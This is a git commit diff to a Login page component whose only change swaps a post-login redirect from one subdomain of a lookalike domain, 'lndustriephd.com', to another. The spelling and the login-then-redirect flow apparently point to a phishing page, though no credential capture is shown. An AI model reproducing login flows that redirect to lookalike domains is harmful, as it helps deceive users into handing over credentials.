dcae695a05350febc0c813dfdf156688cf11150b
husknet <127146284+husknet@users.noreply.github.com>
2025-01-28 04:18:08 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sag.lndustriephd.com/';
+      window.location.href = 'https://sca.lndustriephd.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
